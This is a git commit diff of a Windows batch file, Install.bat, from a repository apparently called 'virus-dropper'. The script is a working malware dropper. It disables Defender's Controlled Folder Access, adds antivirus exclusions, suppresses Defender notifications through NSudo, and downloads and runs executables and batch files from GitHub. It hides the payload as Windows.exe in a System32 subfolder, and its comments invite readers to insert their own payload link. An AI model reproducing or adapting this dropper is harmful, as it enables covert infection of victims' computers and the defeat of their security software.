d2d8e07036f9ad50f73fdf5f1cb01ee3ee1af159
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-04-29 19:08:33 -0400

    Update Install.bat

--- install/Install.bat
+++ install/Install.bat
@@ -1,19 +1,17 @@
 color ef
+::disables ControlledFolderAccess to access files and folders
+powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
 start /min AV.bat
-powershell -Command "Unblock-file 'AV.bat'"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
 NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
-::disables ControlledFolderAccess to access files and folders
-powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
 ::windows defender exclusions
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
 ::direct download link
 ::edit this to your files
 md "%systemroot%\System32\Windowsexe"
-start "" Rickroll.mp4
 
 ::upload files here: github.com - create account and create repository (public) then upload files
 ::put payload file DIRECT download link here:
@@ -23,11 +21,9 @@ curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Wi
 
 move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
 curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
-powershell -Command "Unblock-file 'Update.bat'"
 move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
 NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
-powershell -Command "Unblock-file '%systemroot%\System32\Windowsexe\Windows.exe'"
 start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
 move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
